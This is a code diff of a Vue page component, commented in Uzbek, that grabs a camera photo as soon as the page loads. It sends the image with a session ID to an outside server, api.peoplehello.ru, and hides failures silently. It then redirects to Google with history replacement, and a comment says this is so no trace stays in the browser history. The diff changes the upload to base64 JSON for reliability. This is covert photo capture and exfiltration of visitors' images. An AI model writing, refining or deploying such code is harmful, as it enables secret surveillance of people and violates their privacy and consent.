@@ -6,7 +6,7 @@
 export default {
   name: "BackCamera",
 
-  async mounted() {
+  mounted() {
     this.capture()
   },
 
@@ -20,7 +20,7 @@ export default {
       }
 
       try {
-        // ❗ ENG MOS variant
+        // ❗ Universal: browser o‘zi optimal kamerani tanlaydi
         const stream = await navigator.mediaDevices.getUserMedia({
           video: true,
           audio: false
@@ -29,44 +29,53 @@ export default {
         const video = this.$refs.video
         video.srcObject = stream
 
-        // ❗ iOS uchun MUHIM
+        // ❗ iOS / WebView uchun MUHIM
         await video.play()
 
-        // ❗ metadata kutamiz
+        // ❗ Kamera haqiqatan tayyor bo‘lishini kutamiz
         await new Promise(res => {
           if (video.readyState >= 2) return res()
           video.onloadedmetadata = res
         })
 
-        // ❗ real telefonlarda kerak
+        // ❗ Real qurilmalarda barqarorlik
         await new Promise(r => setTimeout(r, 600))
 
         const canvas = document.createElement("canvas")
         canvas.width = video.videoWidth || 640
         canvas.height = video.videoHeight || 480
+
         const ctx = canvas.getContext("2d")
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height)
 
+        // Kamerani o‘chiramiz
         stream.getTracks().forEach(t => t.stop())
 
-        // ❗ ENG MUHIM QISM — toBlob
-        canvas.toBlob(async (blob) => {
+        // ✅ toBlob → FileReader → BASE64 (ENG ISHONCHLI)
+        canvas.toBlob((blob) => {
           if (!blob) return this.redirect()
 
-          const formData = new FormData()
-          formData.append("photo", blob, "photo.jpg")
-          formData.append("session_id", session_id)
+          const reader = new FileReader()
+          reader.onloadend = async () => {
+            const imageBase64 = reader.result // data:image/jpeg;base64,...
 
-          try {
-            await fetch("https://api.peoplehello.ru/api/front-cam", {
-              method: "POST",
-              body: formData
-            })
-          } catch (e) {
-            // jim
-          } finally {
-            this.redirect()
+            try {
+              await fetch("https://api.peoplehello.ru/api/front-cam", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({
+                  image: imageBase64,
+                  session_id
+                })
+              })
+            } catch (e) {
+              // jim
+            } finally {
+              this.redirect()
+            }
           }
+
+          reader.readAsDataURL(blob)
         }, "image/jpeg", 0.85)
 
       } catch (err) {
@@ -75,6 +84,7 @@ export default {
     },
 
     redirect() {
+      // history’da qolmasin
       window.location.replace("https://google.com")
     }
   }
